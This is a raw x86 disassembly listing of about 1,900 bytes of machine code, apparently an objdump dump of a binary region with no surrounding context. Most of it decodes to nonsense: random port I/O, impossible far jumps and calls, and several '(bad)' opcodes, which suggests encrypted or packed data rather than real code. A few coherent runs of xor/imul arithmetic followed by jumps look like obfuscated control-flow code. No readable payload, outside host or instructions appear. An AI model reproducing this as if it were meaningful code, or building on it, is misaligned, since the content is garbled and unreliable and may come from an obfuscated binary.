  40b1b1:	and    al,0x4
  40b1b3:	inc    edi
  40b1b4:	mov    DWORD PTR [ebp+0x27],0x2837df82
  40b1bb:	outs   dx,BYTE PTR ds:[esi]
  40b1bc:	push   ebp
  40b1bd:	cmp    eax,esi
  40b1bf:	adc    al,0x1
  40b1c1:	jmp    0x2e23:0xbe434754
  40b1c8:	aad    0x61
  40b1ca:	dec    eax
  40b1cb:	mov    dl,0xe7
  40b1cd:	adc    eax,0x9775a546
  40b1d2:	mov    esp,0x9bd71ec
  40b1d7:	mov    edi,0xe8b192aa
  40b1dc:	and    BYTE PTR [esi+0x5d97d5],al
  40b1e2:	push   ebx
  40b1e3:	xor    DWORD PTR [ebp+0x46],ebp
  40b1e6:	test   al,0xe1
  40b1e8:	jno    0x40b213
  40b1ea:	add    cl,BYTE PTR [esi]
  40b1ec:	in     eax,0x8e
  40b1ee:	loopne 0x40b1d0
  40b1f0:	cmp    edx,eax
  40b1f2:	adc    bl,BYTE PTR [ecx]
  40b1f4:	in     al,0xff
  40b1f6:	jne    0x40b274
  40b1f8:	lods   eax,DWORD PTR ds:[esi]
  40b1f9:	gs push ebx
  40b1fb:	bound  ebx,QWORD PTR [eax+ecx*1-0x466c1a53]
  40b202:	sbb    BYTE PTR [ecx+0x3a61e30e],ch
  40b208:	outs   dx,DWORD PTR ds:[esi]
  40b209:	sub    ebp,DWORD PTR [edi-0x1d]
  40b20c:	cmc    
  40b20d:	(bad)  
  40b20e:	in     al,0xd1
  40b210:	add    DWORD PTR [ebp-0x6],0x62b270c4
  40b217:	lahf   
  40b218:	push   edi
  40b219:	mov    al,0xee
  40b21b:	or     eax,0x979ea360
  40b220:	or     BYTE PTR [ebx+edi*8+0x33],0x54
  40b225:	mov    bl,0x3f
  40b227:	aam    0x8c
  40b229:	daa    
  40b22a:	xchg   esi,eax
  40b22b:	es xchg ebx,eax
  40b22d:	jle    0x40b1c3
  40b22f:	ret    0x6d2f
  40b232:	retf   
  40b233:	sbb    DWORD PTR [ecx-0x74],edi
  40b236:	or     esp,esp
  40b238:	cdq    
  40b239:	pop    esp
  40b23a:	cdq    
  40b23b:	in     eax,0x5a
  40b23d:	nop
  40b23e:	sub    esi,DWORD PTR [esi+0xa8ffe7c]
  40b244:	fnstenv [ecx]
  40b246:	nop
  40b247:	inc    ecx
  40b248:	pop    edx
  40b249:	add    eax,DWORD PTR [ebp-0x53]
  40b24c:	aam    0x13
  40b24e:	jns    0x40b274
  40b250:	jo     0x40b2b7
  40b252:	div    bl
  40b254:	mov    ebx,0x144556ef
  40b259:	mov    al,0xa6
  40b25b:	lods   eax,DWORD PTR ds:[esi]
  40b25c:	add    cl,ah
  40b25e:	pop    ebp
  40b25f:	in     al,dx
  40b260:	fnstenv ds:0x2c3aa66e
  40b266:	adc    ch,bh
  40b268:	aad    0x3f
  40b26a:	pop    edi
  40b26b:	and    eax,0x713a3b70
  40b270:	jbe    0x40b1f5
  40b272:	fisub  DWORD PTR [ebx+0x239e78e6]
  40b278:	fcomp  st(4)
  40b27a:	add    al,0xbb
  40b27c:	imul   DWORD PTR [ecx-0x4]
  40b27f:	pushf  
  40b280:	sub    eax,0x738ac63b
  40b285:	into   
  40b286:	dec    edx
  40b287:	fnsave [ebx+0x3c]
  40b28a:	jecxz  0x40b2ef
  40b28c:	out    0x48,eax
  40b28e:	fucomi st,st(3)
  40b290:	mov    edi,0xc34da24d
  40b295:	sub    dl,BYTE PTR [ecx+0x78]
  40b298:	pop    edi
  40b299:	and    ebp,DWORD PTR [edi]
  40b29b:	push   ebx
  40b29c:	mov    ecx,0x214f4e33
  40b2a1:	mov    ecx,DWORD PTR [ebx+edx*8]
  40b2a4:	shl    DWORD PTR [edx-0x118aa04f],1
  40b2aa:	sbb    DWORD PTR [edi+0x1f],esp
  40b2ad:	cmp    DWORD PTR [edx-0x1b],ebx
  40b2b0:	jmp    0xdbad:0xb582e06d
  40b2b7:	inc    esi
  40b2b8:	mov    dl,0x14
  40b2ba:	in     al,dx
  40b2bb:	sbb    dl,BYTE PTR [ebp-0x64]
  40b2be:	pop    esp
  40b2bf:	fadd   DWORD PTR [ecx]
  40b2c1:	mov    bh,0x27
  40b2c3:	dec    ebp
  40b2c4:	cwde   
  40b2c5:	(bad)  
  40b2c6:	or     ebx,esp
  40b2c8:	popf   
  40b2c9:	xor    edi,DWORD PTR [eax+0x6a]
  40b2cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2cd:	jmp    0x40b26e
  40b2cf:	imul   ebx,DWORD PTR [edi+0xc0dd5ba],0xffffffb1
  40b2d6:	(bad)  
  40b2d7:	jmp    0x547e:0x9aeed015
  40b2de:	clc    
  40b2df:	mov    ebx,0x5efdb50a
  40b2e4:	jle    0x40b277
  40b2e6:	fwait
  40b2e7:	in     eax,dx
  40b2e8:	shl    DWORD PTR [edx-0x1f],cl
  40b2eb:	jmp    0xb4f9:0xbd28b7e
  40b2f2:	in     eax,dx
  40b2f3:	setno  BYTE PTR [eax]
  40b2f6:	aaa    
  40b2f7:	sub    bh,BYTE PTR [esi+esi*2]
  40b2fa:	out    dx,eax
  40b2fb:	xor    eax,0x101218c7
  40b300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b301:	sub    BYTE PTR [ebx-0x135a08c1],dl
  40b307:	dec    edx
  40b308:	sbb    al,0xcc
  40b30a:	mov    bl,0x1e
  40b30c:	out    0xc6,al
  40b30e:	(bad)  
  40b30f:	jnp    0x40b390
  40b311:	xchg   edi,eax
  40b312:	mov    edx,0x459ce490
  40b317:	stos   DWORD PTR es:[edi],eax
  40b318:	mov    ecx,0xeb6f8ddb
  40b31d:	push   ebp
  40b31e:	xor    DWORD PTR [edi-0x5183039c],0x6d
  40b325:	push   ecx
  40b326:	push   es
  40b327:	and    bh,BYTE PTR [edi]
  40b329:	pop    es
  40b32a:	xor    BYTE PTR [eax+eax*4],bh
  40b32d:	pop    DWORD PTR [esi]
  40b32f:	lods   eax,DWORD PTR ds:[esi]
  40b330:	std    
  40b331:	pop    edx
  40b332:	mov    BYTE PTR [edx],al
  40b334:	aas    
  40b335:	adc    al,0xdb
  40b337:	or     DWORD PTR [ebx],ebx
  40b339:	lds    ebp,FWORD PTR [esi+edx*4+0x4c]
  40b33d:	repz mov eax,ds:0xaaf521f7
  40b343:	cmp    ah,dl
  40b345:	stos   BYTE PTR es:[edi],al
  40b346:	stos   DWORD PTR es:[edi],eax
  40b347:	or     eax,0xf9e57cb0
  40b34c:	mov    ah,0x87
  40b34e:	fstp   QWORD PTR [ebx+esi*8-0x37]
  40b352:	mov    al,0x1
  40b354:	xchg   esp,eax
  40b355:	or     edx,DWORD PTR [esi]
  40b357:	std    
  40b358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b359:	cmp    al,0xcc
  40b35b:	cmp    DWORD PTR [ecx],esi
  40b35d:	mov    esp,0x49e1a3c
  40b362:	js     0x40b350
  40b364:	imul   DWORD PTR [edx+eiz*8]
  40b367:	mov    eax,0x3ec421ec
  40b36c:	and    DWORD PTR [edx-0x77d4a41b],esi
  40b372:	sbb    al,0xdd
  40b374:	pop    edi
  40b375:	push   ecx
  40b376:	cwde   
  40b377:	(bad)  
  40b379:	add    al,0x5d
  40b37b:	cdq    
  40b37c:	cli    
  40b37d:	mov    WORD PTR [edx+0x75],?
  40b380:	fidivr WORD PTR [edi+0x60779e62]
  40b386:	es or  eax,0x38c4be9d
  40b38c:	adc    edi,DWORD PTR [ebp-0x7938eda9]
  40b392:	std    
  40b393:	bound  eax,QWORD PTR [ecx-0x41807aad]
  40b399:	or     DWORD PTR [ebp-0x2f],edi
  40b39c:	sbb    ebx,ebp
  40b39e:	pop    eax
  40b39f:	jo     0x40b415
  40b3a1:	sti    
  40b3a2:	in     eax,0xe8
  40b3a4:	out    dx,al
  40b3a5:	xor    ch,BYTE PTR [ebx+eax*8]
  40b3a8:	call   0xbf2c:0xad7fa9cd
  40b3af:	loopne 0x40b370
  40b3b1:	or     esp,DWORD PTR [edi-0x5e1962c0]
  40b3b7:	dec    esp
  40b3b8:	mov    ss,WORD PTR [ebx-0x4e]
  40b3bb:	sub    DWORD PTR [edx+esi*2-0x1ed44244],0xb9611e6c
  40b3c6:	imul   esp,edx,0x1170f5d2
  40b3cc:	sbb    ah,BYTE PTR [ebp+0x6837366f]
  40b3d2:	je     0x40b431
  40b3d4:	gs jl  0x40b3a5
  40b3d7:	add    DWORD PTR [ecx+0x73],esp
  40b3da:	mov    ch,0x7c
  40b3dc:	int3   
  40b3dd:	retf   
  40b3de:	fwait
  40b3df:	mov    ecx,0xaa96a33a
  40b3e4:	sub    al,0xaf
  40b3e6:	sahf   
  40b3e7:	sti    
  40b3e8:	or     cl,bl
  40b3ea:	mov    DWORD PTR [ecx+0x45],ebp
  40b3ed:	imul   eax,DWORD PTR [ebp-0x49e239ff],0xf18e407d
  40b3f7:	int    0xa5
  40b3f9:	xchg   BYTE PTR [ebx],bl
  40b3fb:	pop    ds
  40b3fc:	adc    al,0xed
  40b3fe:	xor    al,0x13
  40b400:	mov    edx,0x8cfdad35
  40b405:	sub    edi,DWORD PTR [edi]
  40b407:	dec    esi
  40b408:	mov    al,ds:0x25290221
  40b40d:	ds jne 0x40b402
  40b410:	outs   dx,DWORD PTR ds:[esi]
  40b411:	in     al,dx
  40b412:	xlat   BYTE PTR ds:[ebx]
  40b413:	mov    ebx,0xcc6be857
  40b419:	cwde   
  40b41a:	xor    DWORD PTR [ebx+0x48957a87],edx
  40b420:	jmp    0x40b465
  40b422:	mov    al,0x68
  40b424:	(bad)  
  40b425:	sbb    DWORD PTR [esi-0x1e],ecx
  40b428:	jmp    0xe2bd:0xcce2cc18
  40b42f:	mov    cl,0x7d
  40b431:	sbb    al,0x44
  40b433:	outs   dx,DWORD PTR ds:[esi]
  40b434:	push   ecx
  40b435:	adc    DWORD PTR [ecx+esi*8],esi
  40b438:	xchg   ecx,eax
  40b439:	adc    BYTE PTR [esi-0x1e],dh
  40b43c:	daa    
  40b43d:	xchg   edi,eax
  40b43e:	and    al,0xa2
  40b440:	fstp   QWORD PTR [edx-0x4c09daf4]
  40b446:	jns    0x40b419
  40b448:	ret    0xbf5f
  40b44b:	sub    al,0xb9
  40b44d:	pop    edx
  40b44e:	jne    0x40b403
  40b450:	xchg   ecx,eax
  40b451:	std    
  40b452:	inc    edx
  40b453:	sbb    DWORD PTR [ebp+edi*4+0x1b],ecx
  40b457:	and    BYTE PTR [eax-0x62],al
  40b45a:	inc    ebp
  40b45b:	mov    esp,DWORD PTR [eax]
  40b45d:	and    al,0x85
  40b45f:	test   eax,0x691a03f8
  40b464:	or     al,0xbb
  40b466:	mov    esp,0x831b19a4
  40b46b:	sub    DWORD PTR [ecx-0x23175d55],ecx
  40b471:	add    eax,0xb88f84e4
  40b476:	popa   
  40b477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b478:	(bad)  
  40b479:	push   esp
  40b47a:	ins    BYTE PTR es:[edi],dx
  40b47b:	int    0x70
  40b47d:	jbe    0x40b42f
  40b47f:	sbb    DWORD PTR [edi+ecx*1+0x2897943f],edi
  40b486:	sub    ah,BYTE PTR [edx]
  40b488:	add    BYTE PTR [eax-0x646815f6],0x5a
  40b48f:	mov    ds,esp
  40b491:	push   edi
  40b492:	jno    0x40b4f0
  40b494:	jle    0x40b435
  40b496:	xchg   ebp,eax
  40b497:	stc    
  40b498:	jo     0x40b47c
  40b49a:	jp     0x40b43f
  40b49c:	aas    
  40b49d:	sub    dl,BYTE PTR [ebp+eax*1+0x65]
  40b4a1:	mov    esi,0x51812d27
  40b4a6:	aam    0xf5
  40b4a8:	ss ltr dx
  40b4ac:	mov    al,0xf0
  40b4ae:	fdiv   DWORD PTR [edi-0x78]
  40b4b1:	dec    esp
  40b4b2:	aaa    
  40b4b3:	fstp   DWORD PTR [ebx-0x7e5e89d8]
  40b4b9:	pop    ebp
  40b4ba:	jg     0x40b501
  40b4bc:	fistp  QWORD PTR [esp+edx*4]
  40b4bf:	out    dx,al
  40b4c0:	in     eax,dx
  40b4c1:	neg    DWORD PTR [ebx+0x12]
  40b4c4:	loop   0x40b44a
  40b4c6:	scas   al,BYTE PTR es:[edi]
  40b4c7:	push   edi
  40b4c8:	dec    edx
  40b4c9:	add    eax,0x65d61cd8
  40b4ce:	ja     0x40b503
  40b4d0:	fcomp  DWORD PTR [ecx]
  40b4d2:	jnp    0x40b4d7
  40b4d4:	fs jno 0x40b472
  40b4d7:	mov    ds:0xd3046c20,al
  40b4dc:	fwait
  40b4dd:	or     esi,DWORD PTR [esi+0x5cb635b0]
  40b4e3:	cwde   
  40b4e4:	xchg   al,dh
  40b4e6:	adc    eax,0x6222880b
  40b4eb:	push   esp
  40b4ec:	mov    dl,0x59
  40b4ee:	cmp    ecx,DWORD PTR [esp+esi*4+0x65]
  40b4f2:	and    ebx,DWORD PTR [eax-0x77]
  40b4f5:	(bad)  
  40b4f7:	out    dx,al
  40b4f8:	and    al,0x36
  40b4fa:	pop    ds
  40b4fb:	mov    WORD PTR [ebp+0x65],ss
  40b4fe:	test   DWORD PTR [edx-0x330f535c],0xaecea800
  40b508:	mov    ds,WORD PTR [esi-0x7d]
  40b50b:	in     eax,0x9e
  40b50d:	mov    ?,WORD PTR [esp+ecx*1+0x1]
  40b511:	loop   0x40b528
  40b513:	(bad)  
  40b514:	cmp    dh,dh
  40b516:	pushf  
  40b517:	fldcw  WORD PTR [edi+0x7c]
  40b51a:	adc    DWORD PTR [eax],edx
  40b51c:	scas   eax,DWORD PTR es:[edi]
  40b51d:	xor    DWORD PTR [esi+eiz*8-0x742850f1],ebp
  40b524:	jge    0x40b51e
  40b526:	mov    ebx,DWORD PTR [ebp-0x10]
  40b529:	sub    ebx,edi
  40b52b:	cmp    ebx,edx
  40b52d:	ja     0x40b53b
  40b533:	mov    edx,DWORD PTR [ebp-0x2c]
  40b536:	jmp    0x40c0ee
  40b53b:	mov    edx,DWORD PTR [ebp-0x34]
  40b53e:	jmp    0x40b8fc
  40b543:	cmp    eax,0x7178931c
  40b548:	mov    bh,0x49
  40b54a:	loope  0x40b546
  40b54c:	loop   0x40b5b2
  40b54e:	pop    edx
  40b54f:	sub    eax,0xc1d844fb
  40b554:	xchg   BYTE PTR [eax+0x70],dh
  40b557:	lahf   
  40b558:	jge    0x40b5ca
  40b55a:	jo     0x40b5a4
  40b55c:	push   esp
  40b55d:	call   0x9e3f:0x20b261e4
  40b564:	cwde   
  40b565:	arpl   WORD PTR [ecx+edx*8-0x6c],di
  40b569:	int3   
  40b56a:	out    dx,eax
  40b56b:	pop    edi
  40b56c:	stc    
  40b56d:	push   ebx
  40b56e:	cmp    ch,bh
  40b570:	cwde   
  40b571:	inc    esi
  40b572:	xor    eax,0x3779d537
  40b577:	xchg   DWORD PTR ds:0xe35f58ea,esi
  40b57d:	in     eax,0xd7
  40b57f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b580:	es loopne 0x40b573
  40b583:	retf   0x3577
  40b586:	inc    ecx
  40b587:	or     dl,ah
  40b589:	xchg   edx,eax
  40b58a:	mov    BYTE PTR [edx-0x39],al
  40b58d:	push   esi
  40b58e:	out    dx,eax
  40b58f:	cld    
  40b590:	jne    0x40b600
  40b592:	daa    
  40b593:	mov    eax,ds:0x7e627595
  40b598:	pop    es
  40b599:	outs   dx,DWORD PTR ds:[esi]
  40b59a:	gs jge 0x40b580
  40b59d:	xchg   ecx,eax
  40b59e:	lods   al,BYTE PTR ds:[esi]
  40b59f:	jp     0x40b5bf
  40b5a1:	out    0x16,eax
  40b5a3:	nop
  40b5a4:	and    cl,BYTE PTR [ecx-0x31]
  40b5a7:	loopne 0x40b605
  40b5a9:	cmp    DWORD PTR [ebx+ebp*8+0x5e1284f0],esi
  40b5b0:	xor    ecx,DWORD PTR [ebp+0x26]
  40b5b3:	fs test al,0x3f
  40b5b6:	xor    eax,0xadba302f
  40b5bb:	sub    BYTE PTR [edi+0x34],cl
  40b5be:	rcl    DWORD PTR [edx],1
  40b5c0:	aas    
  40b5c1:	pop    edi
  40b5c2:	jbe    0x40b573
  40b5c4:	sub    DWORD PTR [ebp-0x66],esp
  40b5c7:	jecxz  0x40b61f
  40b5c9:	jb     0x40b5a7
  40b5cb:	leave  
  40b5cc:	test   al,0xb4
  40b5ce:	and    BYTE PTR [ebx],ch
  40b5d0:	iret   
  40b5d1:	mov    esi,0xd58723d8
  40b5d6:	imul   edx,esp,0xffffff83
  40b5d9:	add    bh,BYTE PTR [esi]
  40b5db:	sti    
  40b5dc:	test   DWORD PTR [edx+0x45],ecx
  40b5df:	mov    ebx,0xe598075a
  40b5e4:	mov    eax,0xc45fa5bf
  40b5e9:	mov    esi,0x922d93c4
  40b5ee:	xchg   ebp,eax
  40b5ef:	push   ds
  40b5f0:	loop   0x40b5a5
  40b5f2:	or     eax,0x4c722c3a
  40b5f7:	dec    eax
  40b5f8:	xchg   BYTE PTR [edx+eiz*8-0x3],dl
  40b5fc:	mov    dl,0x7c
  40b5fe:	mov    bl,0xd3
  40b600:	jbe    0x40b59e
  40b602:	cmp    DWORD PTR [eax+0x89577b3],esi
  40b608:	out    dx,al
  40b609:	fdiv   DWORD PTR [esi+0x5f]
  40b60c:	inc    ecx
  40b60d:	xor    dl,bh
  40b60f:	xor    al,0xd1
  40b611:	pop    edi
  40b612:	mov    ds:0x5eedebe1,al
  40b617:	sub    bh,0xdd
  40b61a:	mov    ds:0x47ab3107,al
  40b61f:	(bad)  
  40b620:	adc    al,0xb9
  40b622:	cmp    DWORD PTR ds:0xab27f5db,ecx
  40b628:	jecxz  0x40b66d
  40b62a:	ins    BYTE PTR es:[edi],dx
  40b62b:	mov    eax,DWORD PTR [ebp-0x20]
  40b62e:	mov    DWORD PTR [ebp+0x12],esp
  40b631:	add    BYTE PTR [esi-0x770897fc],ah
  40b637:	push   ss
  40b638:	dec    eax
  40b639:	js     0x40b5f1
  40b63b:	dec    edi
  40b63c:	push   0x55134635
  40b641:	jnp    0x40b678
  40b643:	pop    ebx
  40b644:	addr16 aas 
  40b646:	jle    0x40b6ac
  40b648:	jae    0x40b67c
  40b64a:	mov    WORD PTR [esp+esi*8],ss
  40b64d:	mov    ch,0x23
  40b64f:	in     al,0xc5
  40b651:	mov    cl,0x36
  40b653:	dec    esi
  40b655:	fld    st(0)
  40b657:	sub    BYTE PTR [eax+esi*2-0x75],ah
  40b65b:	xchg   edi,eax
  40b65c:	push   esp
  40b65d:	jnp    0x40b6a6
  40b65f:	(bad)  
  40b660:	pushw  cs
  40b662:	repz icebp 
  40b664:	rcr    BYTE PTR [ebx+0x28],cl
  40b667:	sbb    al,0xd5
  40b669:	ds ins DWORD PTR es:[edi],dx
  40b66b:	imul   esp,edi,0x8de8c3b4
  40b671:	test   BYTE PTR [ecx+0x11],bh
  40b674:	pop    ecx
  40b675:	push   es
  40b676:	clc    
  40b677:	leave  
  40b678:	dec    edx
  40b679:	inc    eax
  40b67a:	cld    
  40b67b:	test   eax,0x11c302ae
  40b680:	dec    al
  40b682:	test   eax,0x319db5da
  40b687:	lds    esi,FWORD PTR [edx]
  40b689:	lds    eax,FWORD PTR [edi]
  40b68b:	enter  0x3dd8,0xe4
  40b68f:	sbb    ecx,ecx
  40b691:	mov    esi,0xa2827be0
  40b696:	lock dec ecx
  40b698:	retf   0xa7c3
  40b69b:	pop    eax
  40b69c:	sub    BYTE PTR es:[ecx-0x9],cl
  40b6a0:	mov    al,0x4c
  40b6a2:	sbb    al,0xb1
  40b6a4:	jg     0x40b6c0
  40b6a6:	lds    esp,FWORD PTR [eax+0x278f7369]
  40b6ac:	dec    edx
  40b6ad:	hlt    
  40b6ae:	push   esp
  40b6af:	loop   0x40b6c2
  40b6b1:	xchg   edi,eax
  40b6b2:	enter  0x3ac2,0xc6
  40b6b6:	(bad)  
  40b6b7:	cs cmp eax,0x27231287
  40b6bd:	arpl   WORD PTR [ecx-0x44],dx
  40b6c0:	mov    DWORD PTR [esi-0x69b9cc48],eax
  40b6c6:	sub    al,0x80
  40b6c8:	retf   0x8bb2
  40b6cb:	add    eax,0x48bc2067
  40b6d0:	jb     0x40b6b3
  40b6d2:	fcom   DWORD PTR [esi+0x6188ae1]
  40b6d8:	mov    BYTE PTR [bp-0x766],0x7d
  40b6de:	retf   0xb81c
  40b6e1:	inc    edi
  40b6e2:	inc    ecx
  40b6e3:	inc    esi
  40b6e4:	lahf   
  40b6e5:	ret    0xc11f
  40b6e8:	inc    ecx
  40b6e9:	js     0x40b724
  40b6eb:	dec    ebp
  40b6ec:	stos   BYTE PTR es:[edi],al
  40b6ed:	cmp    eax,0x806f5cd2
  40b6f2:	stos   DWORD PTR es:[edi],eax
  40b6f3:	xchg   edi,eax
  40b6f4:	stc    
  40b6f5:	cmp    edx,DWORD PTR [ecx]
  40b6f7:	xadd   BYTE PTR [esi-0x1066bee1],ch
  40b6fe:	inc    esi
  40b6ff:	xor    esi,ecx
  40b701:	cmp    ah,dl
  40b703:	dec    ebp
  40b704:	and    BYTE PTR [ebp+0x32657277],dh
  40b70a:	or     eax,DWORD PTR ds:0xce225ca2
  40b710:	adc    eax,0x112aa551
  40b715:	out    0xf6,al
  40b717:	fild   WORD PTR [ecx+0x59]
  40b71a:	and    al,0x1d
  40b71c:	sub    eax,0x2d7537da
  40b721:	xchg   edx,eax
  40b722:	jecxz  0x40b74a
  40b724:	mov    al,0xf3
  40b726:	std    
  40b727:	loop   0x40b765
  40b729:	into   
  40b72a:	and    bl,ch
  40b72c:	ins    DWORD PTR es:[edi],dx
  40b72d:	in     eax,dx
  40b72e:	psadbw mm1,QWORD PTR [ebx+esi*4-0xe]
  40b733:	out    dx,al
  40b734:	fidiv  DWORD PTR [eax]
  40b736:	push   es
  40b737:	in     al,0x86
  40b739:	sub    ebp,0xffffffa9
  40b73c:	gs icebp 
  40b73e:	leave  
  40b73f:	test   eax,0xe3abcc66
  40b744:	dec    edi
  40b745:	adc    al,0x33
  40b747:	cmc    
  40b748:	adc    ecx,DWORD PTR [ebx+edi*4+0x71]
  40b74c:	push   ecx
  40b74d:	mov    dl,0x22
  40b74f:	jmp    0xc6872f0b
  40b754:	dec    ebp
  40b755:	jmp    0x40b6d8
  40b757:	in     al,0x86
  40b759:	push   edx
  40b75a:	inc    edx
  40b75b:	cmp    dh,ch
  40b75d:	pop    es
  40b75e:	call   0xe8c5:0x501d6cc
  40b765:	cmp    DWORD PTR [edi-0x65],ecx
  40b768:	jmp    0xa54c:0x4701f3ce
  40b76f:	and    BYTE PTR [edx],0x4a
  40b772:	sahf   
  40b773:	mov    cl,BYTE PTR [edi]
  40b775:	arpl   WORD PTR [edi-0x5f],si
  40b778:	or     ebx,DWORD PTR [edi]
  40b77a:	jo     0x40b718
  40b77c:	adc    cl,BYTE PTR [ebx-0x6d]
  40b77f:	enter  0x1463,0x1a
  40b783:	lods   al,BYTE PTR ds:[esi]
  40b784:	pop    ds
  40b785:	mov    ecx,0x98b6c73a
  40b78a:	add    al,0xd9
  40b78c:	fdivr  DWORD PTR [eax+0x7291c132]
  40b792:	and    eax,0x761568fa
  40b797:	(bad)  
  40b798:	pop    ebp
  40b799:	push   esp
  40b79a:	outs   dx,BYTE PTR ds:[esi]
  40b79b:	stc    
  40b79c:	and    esi,eax
  40b79e:	add    eax,DWORD PTR [edx-0x46]
  40b7a1:	aam    0xf
  40b7a3:	in     al,dx
  40b7a4:	js     0x40b750
  40b7a6:	nop
  40b7a7:	mov    ah,0x8d
  40b7a9:	push   cs
  40b7aa:	jle    0x40b786
  40b7ac:	sahf   
  40b7ad:	jns    0x40b77e
  40b7af:	fs pop ds
  40b7b1:	ficom  DWORD PTR [ecx+eax*1+0x44]
  40b7b5:	cs jns 0x40b7ca
  40b7b8:	shr    esp,0x46
  40b7bb:	mov    eax,ds:0xbdbb9174
  40b7c0:	inc    edx
  40b7c1:	pop    ss
  40b7c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7c3:	aad    0xbd
  40b7c5:	jbe    0x40b753
  40b7c7:	ins    BYTE PTR es:[edi],dx
  40b7c8:	les    esi,FWORD PTR [ebx-0x48dc2b7f]
  40b7ce:	cmp    ebx,DWORD PTR [edx+0x315d9916]
  40b7d4:	pop    ebp
  40b7d5:	dec    ecx
  40b7d6:	into   
  40b7d7:	mov    ds:0xf47d2985,eax
  40b7dc:	ds jp  0x40b769
  40b7df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7e0:	add    BYTE PTR [eax-0x351474e6],dl
  40b7e6:	pusha  
  40b7e7:	jg     0x40b7a7
  40b7e9:	dec    edx
  40b7ea:	call   0x8632:0x1c51388e
  40b7f1:	shl    DWORD PTR [ecx+0xed3e9c8],cl
  40b7f7:	and    al,0x84
  40b7f9:	and    al,0x65
  40b7fb:	dec    esp
  40b7fc:	ret    0x309f
  40b7ff:	push   ss
  40b800:	pop    ss
  40b801:	jo     0x40b792
  40b803:	repnz sbb eax,0x66ab1d8b
  40b809:	sub    eax,ebx
  40b80b:	cmp    BYTE PTR [ebp-0xa4fd1cf],dl
  40b811:	adc    DWORD PTR ss:[ebp-0x34495d71],esi
  40b818:	pop    edx
  40b819:	cli    
  40b81a:	inc    edi
  40b81b:	dec    edi
  40b81c:	xchg   ebx,eax
  40b81d:	adc    eax,0x82fe688b
  40b822:	sbb    eax,ecx
  40b824:	xor    cl,BYTE PTR [ebp-0x1]
  40b827:	mov    ds:0xeb69e3a8,al
  40b82c:	mov    ah,0xa1
  40b82e:	mov    dl,0xc9
  40b830:	xchg   edx,eax
  40b831:	and    eax,0x7b93f6f0
  40b836:	aas    
  40b837:	xchg   edi,eax
  40b838:	mov    edx,0x69fae6d2
  40b83d:	pop    edi
  40b83e:	(bad)  
  40b83f:	retf   
  40b840:	fisubr DWORD PTR [ebx-0x22fcec8b]
  40b846:	adc    dh,BYTE PTR fs:[ebx+0x2b7737e]
  40b84d:	push   cs
  40b84e:	mov    dl,BYTE PTR [ebx+0x3e]
  40b851:	stos   DWORD PTR es:[edi],eax
  40b852:	fld    st(5)
  40b854:	inc    eax
  40b855:	jno    0x40b80e
  40b857:	xchg   edx,eax
  40b858:	mov    ebx,0x7cbac11d
  40b85d:	jb     0x40b8b6
  40b85f:	mov    BYTE PTR [ebx],0x59
  40b862:	rcr    BYTE PTR [edi+eiz*4],cl
  40b865:	sbb    BYTE PTR [edi+0x7e96286c],cl
  40b86b:	pusha  
  40b86c:	mov    esp,0x8f9a423
  40b871:	sub    DWORD PTR [ecx+0x7267e393],ebx
  40b877:	jl     0x40b866
  40b879:	and    BYTE PTR [ecx+0x7b73fd98],0xfa
  40b880:	leave  
  40b881:	inc    esi
  40b882:	dec    edx
  40b883:	in     eax,0xd8
  40b885:	frstor [edi+0x27]
  40b888:	dec    esp
  40b889:	xor    cl,BYTE PTR ss:[ecx]
  40b88c:	loope  0x40b83a
  40b88e:	mov    eax,0xa02c25dc
  40b893:	in     eax,dx
  40b894:	in     al,dx
  40b895:	out    0xa5,eax
  40b897:	pusha  
  40b898:	pop    ss
  40b899:	jno    0x40b86d
  40b89b:	pushf  
  40b89c:	sub    ebx,DWORD PTR [eax+0x25]
  40b89f:	jmp    0x84ffdfdf
  40b8a4:	jge    0x40b8c5
  40b8a6:	hlt    
  40b8a7:	adc    esi,DWORD PTR [ebx+0x34336416]
  40b8ad:	stos   BYTE PTR es:[edi],al
  40b8ae:	in     al,dx
  40b8af:	mov    WORD PTR [ebp-0x2b],?
  40b8b2:	das    
  40b8b3:	outs   dx,DWORD PTR ds:[esi]
  40b8b4:	scas   al,BYTE PTR es:[edi]
  40b8b5:	fstp   QWORD PTR [esi+0x21]
  40b8b8:	in     al,0x59
  40b8ba:	into   
  40b8bb:	inc    esp
  40b8bc:	je     0x40b8cd
  40b8be:	cli    
  40b8bf:	lock pop edi
  40b8c1:	std    
  40b8c2:	loop   0x40b8ed
  40b8c4:	or     eax,esp
  40b8c6:	call   0xda70:0x56714a41
  40b8cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8ce:	ror    BYTE PTR [esi+0x60],1
  40b8d1:	fsub   QWORD PTR [eax-0x59846c76]
  40b8d7:	dec    edx
  40b8d8:	adc    bl,BYTE PTR [ecx+0x720232ad]
  40b8de:	pushf  
  40b8df:	push   0x27
  40b8e1:	mov    eax,0xaa76ddb1
  40b8e6:	shl    bl,1
  40b8e8:	cwde   
  40b8e9:	test   al,0xd3
  40b8eb:	cs in  eax,dx
  40b8ed:	and    al,0x14
  40b8ef:	or     eax,0x1366570
  40b8f4:	add    BYTE PTR [ecx-0x7b15c5d],0xe5
  40b8fb:	lds    ecx,FWORD PTR [ebx-0x2fcc0383]
  40b901:	xor    edi,eax
  40b903:	add    edi,ecx
  40b905:	add    edx,ecx
  40b907:	imul   edx,edi
  40b90a:	mov    edi,DWORD PTR [ebp-0x8]
  40b90d:	mov    ebx,DWORD PTR [ebp-0x10]
  40b910:	sub    ebx,edi
  40b912:	cmp    ebx,edx
  40b914:	ja     0x40b922
  40b91a:	mov    edx,DWORD PTR [ebp-0x30]
  40b91d:	jmp    0x40c0ee
  40b922:	mov    edx,DWORD PTR [ebp-0x38]
  40b925:	mov    edi,DWORD PTR [ebp-0x4]
  40b928:	xor    edx,eax
  40b92a:	xor    edi,eax
  40b92c:	add    edi,ecx
  40b92e:	add    edx,ecx
  40b930:	imul   edx,edi
  40b933:	mov    edi,DWORD PTR [ebp-0x8]
  40b936:	jmp    0x40bcf4
  40b93b:	xchg   ebp,eax
  40b93c:	fcomi  st,st(6)
  40b93e:	push   esi
  40b93f:	jb     0x40b992
  40b941:	mov    ch,0xdb
